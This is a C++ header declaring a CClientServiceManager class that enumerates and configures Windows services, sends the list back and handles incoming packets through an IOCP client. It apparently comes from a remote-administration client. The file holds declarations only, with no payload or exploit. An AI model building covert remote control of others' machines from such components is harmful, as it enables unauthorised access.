#pragma once
#include "Manager.h"
#include "Common.h"


typedef struct _SERVICE_INFORMATION_
{
	CHAR ServiceName[MAX_PATH];
	CHAR DisplayName[MAX_PATH];
	char CurrentState[MAX_PATH];
	char RunWay[MAX_PATH];
	char BinaryPathName[MAX_PATH * 2];


}SERVICE_INFORMATION, *PSERVICE_INFORMATION;
typedef SIZE_T(*LPFN_SEENUMSERVICELIST)(vector<_SERVICE_INFORMATION_>& ServiceInfo);

typedef BOOL(*LPFN_SECONFIGSERVICE)(char Method, char* ServiceName);


class CClientServiceManager :
	public CManager
{
public:
	CClientServiceManager(CIOCPClient* ClientObject);
	~CClientServiceManager();
	BOOL CClientServiceManager::SendClientServiceList();
	virtual void CClientServiceManager::PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength);
	void CClientServiceManager::ConfigClientService(PBYTE BufferData, ULONG BufferLength);
private:
	HMODULE m_ServiceModuleBase = NULL;
	LPFN_SEENUMSERVICELIST m_SeEnumServiceList = NULL;
	LPFN_SECONFIGSERVICE   m_SeCofigService = NULL;
};

